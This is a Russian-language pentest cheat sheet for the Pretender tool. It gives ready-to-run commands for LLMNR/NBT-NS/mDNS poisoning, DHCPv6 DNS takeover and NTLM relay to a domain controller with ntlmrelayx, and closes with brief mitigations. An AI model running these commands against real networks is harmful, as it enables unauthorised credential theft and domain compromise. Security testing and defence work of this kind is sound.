> **Pretender** — высокопроизводительный инструмент на языке Go для проведения атак типа **Name Resolution Poisoning** (LLMNR, NBT-NS, mDNS) и **DHCPv6 DNS Takeover**. Предназначен для перехвата NTLM-аутентификации и проведения атак типа Relay.

### Условия для применения

- **Сетевой уровень:** Нахождение в одном L2-сегменте с жертвами (локальная сеть).
- **Конфигурация AD:** Включенные протоколы широковещательного разрешения имен (по умолчанию в Windows) или отсутствие защиты от поддельных DHCPv6 серверов.
- **Права:** Требуются права `root` или `Administrator` для открытия низкоуровневых сокетов (порты 137, 5355, 547).
### Режимы работы

1. **Passive Mode (`--dry`):** Только слушает сеть и выводит запросы. Идеально для скрытной разведки.

2. **Active Mode (`--spoof`):** Отвечает на запросы, выдавая IP атакующего за запрашиваемый ресурс.

3. **Relay Mode:** Перенаправляет весь входящий трафик на указанный IP (обычно на `ntlmrelayx`).

### Примеры команд для эксплуатации

**1. Скрытая разведка (Recon):** Выяснить, какие протоколы активны в сети и есть ли смысл атаковать
```bash
sudo ./pretender -i eth0 --dry
```

**2. Тотальный спуфинг всех имен (Classic Poisoning):** Отвечать на все запросы LLMNR, NetBIOS и mDNS в сети.
```bash
sudo ./pretender -i eth0 --spoof
```

**3. Атака через IPv6 (DHCPv6 Takeover):** Самый эффективный способ в современных сетях (Win 10/11). Объявляет твой хост DNS-сервером.
```bash
sudo ./pretender -i eth0 --dhcp6 --dns <attacker_ip> --spoof
```

**4. Связка с ntlmrelayx (Комплексная атака):** Pretender ловит жертву, а `ntlmrelayx` использует её данные для входа на сервер.
```bash
# В первом окне запускаем релей на контроллер домена (DC)
impacket-ntlmrelayx -t smb://10.10.10.10 -smb2support

# Во втором окне запускаем Pretender и релеим трафик на себя
sudo ./pretender -i eth0 --spoof --relay 127.0.0.1
```

**5. Нацеленная атака на конкретный хост:** Минимизирует «шум» в сети, атакуя только одну жертву.
```bash
sudo ./pretender -i eth0 --host 192.168.1.50 --spoof
```

### Защита (Mitigation)

- **Disable LLMNR/NBT-NS:** Через GPO (Administrative Templates -> Network -> DNS Client).
- **SMB Signing:** Включить обязательную подпись (Require), чтобы предотвратить Relay.
- **IPv6 Security:** Использовать RA Guard на коммутаторах для блокировки поддельных маршрутизаторов.
